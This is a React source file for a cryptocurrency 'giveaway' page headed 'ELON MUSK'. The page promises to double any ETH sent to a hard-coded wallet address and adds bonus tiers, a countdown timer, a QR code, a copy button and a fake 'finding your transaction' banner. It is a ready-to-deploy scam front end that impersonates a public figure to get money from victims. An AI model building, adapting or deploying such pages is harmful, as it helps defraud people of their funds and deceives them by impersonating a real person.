import React, { useState, useEffect } from "react";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faEthereum } from "@fortawesome/free-brands-svg-icons";
import { QRCodeCanvas } from "qrcode.react"; // Updated import for qrcode.react

// Reusable Ethereum Icon Component
const EthereumIcon = ({ size = "16px", style = {} }) => (
  <FontAwesomeIcon 
    icon={faEthereum} 
    style={{ width: size, height: size, color: "#627eea", ...style }} // Ethereum purple color
  />
);

// Transaction Banner Component
const TransactionBanner = () => {
  const bannerStyles = {
    backgroundColor: "#f4e7ff",
    padding: "20px",
    borderRadius: "15px",
    textAlign: "center",
    fontFamily: "Arial, sans-serif",
    color: "#2c3e50",
    position: "relative",
    display: "flex",
    justifyContent: "center",
    alignItems: "center",
    flexWrap: "wrap",
    gap: "10px",
    width: "400px",
    height: "100px",
    overflow: "hidden",
    marginTop: "20px",
  };

  const contentStyles = {
    position: "relative",
    zIndex: 1,
    display: "flex",
    alignItems: "center",
    gap: "10px",
  };

  const iconStyles = {
    backgroundSize: "contain",
    backgroundRepeat: "no-repeat",
    animation: "glow 1.5s ease-in-out infinite alternate",
    position: "absolute",
  };

  const ethIconStyles = {
    ...iconStyles,
    backgroundImage: `url('https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Ethereum_logo_2014.svg/1200px-Ethereum_logo_2014.svg.png')`,
    backgroundPosition: "center",
  };

  const searchIconStyles = {
    ...iconStyles,
    backgroundImage: `url('https://img.icons8.com/ios-filled/50/000000/search.png')`,
    backgroundPosition: "center",
    width: "25px",
    height: "25px",
    top: "25px",
    left: "50%",
    transform: "translateX(-50%)",
  };

  const loadingDotsStyles = {
    display: "inline-flex",
    alignItems: "center",
  };

  const dotStyles = {
    fontSize: "20px",
    color: "#2c3e50",
    animation: "blink 1.4s infinite both",
  };

  return (
    <div style={bannerStyles}>
      <div style={contentStyles}>
        <span>We're trying to find your transaction</span>
        <div style={loadingDotsStyles}>
          <span style={{ ...dotStyles, animationDelay: "0s" }}>.</span>
          <span style={{ ...dotStyles, animationDelay: "0.2s" }}>.</span>
          <span style={{ ...dotStyles, animationDelay: "0.4s" }}>.</span>
        </div>
      </div>
      <div style={{ ...ethIconStyles, width: "20px", height: "20px", top: "10px", left: "20px" }}></div>
      <div style={{ ...ethIconStyles, width: "25px", height: "25px", top: "15px", left: "150px" }}></div>
      <div style={{ ...ethIconStyles, width: "22px", height: "22px", bottom: "10px", left: "300px" }}></div>
      <div style={{ ...ethIconStyles, width: "18px", height: "18px", bottom: "15px", left: "80px" }}></div>
      <div style={searchIconStyles}></div>
      <style jsx>{`
        @keyframes glow {
          from {
            box-shadow: 0 0 5px #fff, 0 0 10px #e0aaff, 0 0 15px #d4aaff;
            filter: brightness(1);
          }
          to {
            box-shadow: 0 0 10px #fff, 0 0 20px #e0aaff, 0 0 30px #d4aaff;
            filter: brightness(1.2);
          }
        }

        @keyframes blink {
          0% { opacity: 0.2; }
          20% { opacity: 1; }
          100% { opacity: 0.2; }
        }
      `}</style>
    </div>
  );
};

const ETHParticipate = () => {
  const [cryptoData, setCryptoData] = useState({
    ethereum: { usd: 0, usd_24h_change: 0 },
  });
  const [timeLeft, setTimeLeft] = useState(2612); // 43:32 in seconds
  const [showQR, setShowQR] = useState(false);

  useEffect(() => {
    const ws = new WebSocket("wss://stream.binance.com:9443/ws/ethusdt@ticker");

    ws.onopen = () => {
      console.log("WebSocket connected for ETH");
    };

    ws.onmessage = (event) => {
      const data = JSON.parse(event.data);
      setCryptoData({
        ethereum: {
          usd: parseFloat(data.c),
          usd_24h_change: parseFloat(data.P),
        },
      });
    };

    ws.onerror = (error) => {
      console.error("WebSocket error:", error);
    };

    ws.onclose = () => {
      console.log("WebSocket disconnected for ETH");
    };

    return () => {
      ws.close();
    };
  }, []);

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds) => {
    const minutes = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${minutes.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  };

  const copyAddress = () => {
    navigator.clipboard
      .writeText("0xa74f62407855fcbedb0f9730abb55a86387f3ec7")
      .then(() => alert("Address copied to clipboard!"))
      .catch((err) => console.error("Failed to copy address: ", err));
  };

  return (
    <div
      style={{
        fontFamily: "Arial, sans-serif",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        minHeight: "100vh",
        backgroundColor: "#fff",
        padding: "20px",
      }}
    >
      <header
        style={{
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          width: "100%",
          maxWidth: "600px",
          marginBottom: "40px",
        }}
      >
        <h1 style={{ fontSize: "18px", color: "#000", margin: 0, fontWeight: "bold" }}>ELON MUSK</h1>
        <div style={{ display: "flex", alignItems: "center" }}>
          <EthereumIcon size="24px" style={{ marginRight: "8px" }} />
          <span style={{ fontSize: "18px", marginRight: "8px", fontWeight: "bold" }}>
            ${cryptoData.ethereum.usd.toLocaleString()}
          </span>
          <span
            style={{
              fontSize: "16px",
              color: cryptoData.ethereum.usd_24h_change >= 0 ? "#34a853" : "#ea4335",
              fontWeight: "bold",
            }}
          >
            {cryptoData.ethereum.usd_24h_change.toFixed(2)}%
          </span>
        </div>
      </header>
      <main style={{ display: "flex", flexDirection: "column", alignItems: "center", width: "100%", maxWidth: "500px" }}>
        <div
          style={{
            backgroundColor: "#f5f5f5",
            padding: "20px",
            borderRadius: "10px",
            width: "100%",
            boxShadow: "0 2px 4px rgba(0,0,0,0.1)",
            marginBottom: "20px",
          }}
        >
          <h2 style={{ color: "#1a73e8", fontSize: "18px", margin: "0 0 15px 0", fontWeight: "bold" }}>Example:</h2>
          <div style={{ display: "flex", flexDirection: "column", gap: "10px" }}>
            {[
              { send: "1+ ETH", get: "2+ ETH" },
              { send: "5+ ETH", get: "10+ ETH" },
              { send: "10+ ETH", get: "20+ ETH" },
              { send: "25+ ETH", get: "31.25+ ETH", bonus: "+25% Bonus" },
              { send: "50+ ETH", get: "125+ ETH", bonus: "+50% Bonus" },
              { send: "100+ ETH", get: "300+ ETH", bonus: "+100% Bonus" },
            ].map((example, index) => (
              <div
                key={index}
                style={{
                  backgroundColor: "#fff",
                  padding: "10px",
                  borderRadius: "5px",
                  boxShadow: "0 1px 3px rgba(0,0,0,0.1)",
                }}
              >
                <p style={{ margin: 0, color: "#202124", fontSize: "14px", lineHeight: "1.5" }}>
                  Send <span style={{ fontWeight: "bold" }}>{example.send}</span>{" "}
                  <EthereumIcon style={{ verticalAlign: "middle" }} /> get{" "}
                  <span style={{ fontWeight: "bold" }}>{example.get}</span>{" "}
                  <EthereumIcon style={{ verticalAlign: "middle" }} /> back{" "}
                  {example.bonus && (
                    <span style={{ color: "#34a853", fontWeight: "bold" }}>{example.bonus}</span>
                  )}
                </p>
              </div>
            ))}
          </div>
        </div>
        <div
          style={{
            backgroundColor: "#f5f5f5",
            padding: "20px",
            borderRadius: "10px",
            width: "100%",
            boxShadow: "0 2px 4px rgba(0,0,0,0.1)",
            marginBottom: "20px",
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
          }}
        >
          <div style={{ display: "flex", alignItems: "center", marginBottom: "15px" }}>
            <span style={{ fontSize: "24px", marginRight: "10px", color: "#000" }}>🕒</span>
            <span style={{ fontSize: "24px", fontWeight: "bold", color: "#000" }}>{formatTime(timeLeft)}</span>
          </div>
          <p style={{ color: "#202124", fontSize: "16px", fontWeight: "bold", margin: "0 0 10px 0", textAlign: "center" }}>
            Send ETH to the Contribution Address:
          </p>
          <div
            style={{
              display: "flex",
              alignItems: "center",
              backgroundColor: "white",
              padding: "10px",
              borderRadius: "5px",
              width: "100%",
              justifyContent: "space-between",
            }}
          >
            <span style={{ fontSize: "14px", color: "#202124", wordBreak: "break-all" }}>
              0xa74f62407855fcbedb0f9730abb55a86387f3ec7
            </span>
            <button
              onClick={() => setShowQR(!showQR)}
              style={{
                backgroundColor: "transparent",
                border: "none",
                cursor: "pointer",
                fontSize: "20px",
                color: "#1a73e8",
              }}
            >
              {showQR ? "Hide QR" : "Show QR"}
            </button>
          </div>
          {showQR && (
            <QRCodeCanvas
              value="0xa74f62407855fcbedb0f9730abb55a86387f3ec7"
              size={150}
              style={{ marginTop: "20px" }}
            />
          )}
          <button
            onClick={copyAddress}
            style={{
              backgroundColor: "#000",
              color: "#fff",
              padding: "10px",
              borderRadius: "5px",
              fontSize: "16px",
              cursor: "pointer",
              width: "100%",
              textAlign: "center",
              fontWeight: "bold",
              marginTop: "10px",
              border: "none",
            }}
          >
            Copy
          </button>
        </div>
        <p style={{ color: "#202124", fontSize: "14px", textAlign: "center", lineHeight: "1.5", maxWidth: "500px" }}>
          To send the ETH, you can use any wallet or exchange! Once we receive your ETH, we will immediately send double the amount back to you. If you send ETH after the giveaway ends, we will immediately return the same amount back to you.
        </p>
        <TransactionBanner />
      </main>
    </div>
  );
};

export default ETHParticipate;